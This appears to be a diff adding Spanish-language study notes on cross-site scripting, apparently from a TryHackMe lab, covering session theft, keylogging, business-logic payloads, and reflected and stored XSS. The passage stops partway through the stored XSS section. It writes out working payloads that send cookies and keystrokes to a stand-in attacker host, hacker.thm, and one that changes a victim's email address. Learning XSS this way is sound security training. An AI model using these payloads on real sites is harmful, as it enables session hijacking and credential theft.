@@ -75,4 +75,64 @@ Estos sin payloads simples que demostran XSS en las aplicaciones web
 
 ### ROBO DE SESIÓN
 
-Los detalles de la sesión de usuario, son con logins de tokens, aveces conseguiremos las cookies de la maquina víctima. Debajo del script de JS, base64 docificados esta la cookie para una tranmisión y no pueda un hacker tener el contro. Si el atacante consigue las cookies del usuario puede entrar sin necesidad 
+Los detalles de la sesión de usuario, son con logins de tokens, aveces conseguiremos las cookies de la maquina víctima. Debajo del script de JS, base64 docificados esta la cookie para una tranmisión y no pueda un hacker tener el contro. Si el atacante consigue las cookies del usuario puede entrar sin necesidad de logearse. 
+
+```
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+```
+
+### KEY LOGGER
+
+El código debajo del key logger. Cualquier cosa que escribas en la página web será reenviada a un sitio web bajo el control del hacker. Esto puede ser muy dañino para la pagina web porque el payload esta instalado para coger las credenciales del login o tarjetas de crédito.
+
+```
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+```
+
+### LÓGICA DE NEGOCIO
+
+Este payload es mucho más específico que los otros. Esto se hacer para llamar a un recursos en particular de la red o una función JS. Por ejemplo, imaginemos que la funcion de JavaScript cambia el email de usuario llamado "user.changeEmail()". 
+
+```
+<script>user.changeEmail('attacker@hacker.thm');</script>
+```
+
+Hace que la cuenta de correo se cambie, para que el atacante tenga posibilidad de resetear la contraseña.
+
+# XSS REFLEJADO
+
+El XSS refleajdo se hace cuando una consulta HTTP incluye codigo de la página web sin validación.
+
+### ESCENARIO DE EJEMPLO
+
+Una pagina web que si introduces un input mal, te sale un mensaje que te lo dice. 
+
+![image](https://github.com/user-attachments/assets/a31c654f-0d48-43ea-8a22-7e61ff216612)
+
+Esta aplicación no necesita chekear el contenido si es un parametro de error, haciendo que podamos insertar codigo malicioso.
+
+![image](https://github.com/user-attachments/assets/65bd6e80-dd7c-4a9d-a42f-da6f74a779f7)
+
+![image](https://github.com/user-attachments/assets/38b15606-2d58-4aaf-971a-6f09af6e6289)
+
+### IMPACTO POTENCIAL
+
+El atacante puede mandar links o redirecciones dentro del iframe de otra web, contenido JS payload potencial para las victimas, potencial reverse shell o información del customer.
+
+## COMO TESTEAR UN REFLECTED XSS
+
+Necesitaremos siempre testear todas las posibilidades incluyendo:
+
+- Parametros en una consulta con URL
+- Ruta de la URL
+- Cabeceras HTTP
+
+# STORED XSS
+
+Como el nombre se refiere, este tipo de payload se guarda en la aplicación web (en la base de datos)
+
+### EJEMPLO
+
+En un blog los usuarios pueden mandar post. Desafortunadamente, estos comentarios no se chekean por código JS
+
+
